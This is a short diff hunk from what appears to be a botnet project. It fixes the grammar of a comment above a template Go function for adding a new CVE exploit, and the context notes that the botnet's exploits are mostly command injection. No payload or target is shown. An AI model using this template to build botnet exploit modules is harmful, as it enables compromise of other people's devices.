@@ -103,7 +103,7 @@ The exploit that's use in this botnet mostly will be a command injection (tbh it
 	### Example 2 Incase that you don't need to add new HTTP header ###
 	###################################################################
 	
-	# This example is the same like the first example in a term of header and body config.
+	# This example is the same like the first example in term of header and body configs.
 	
 	func (b *Bot) CVE_someYear_newCVE2() {			
 		newCVE2, _ := json.Marshal(map[string]string{
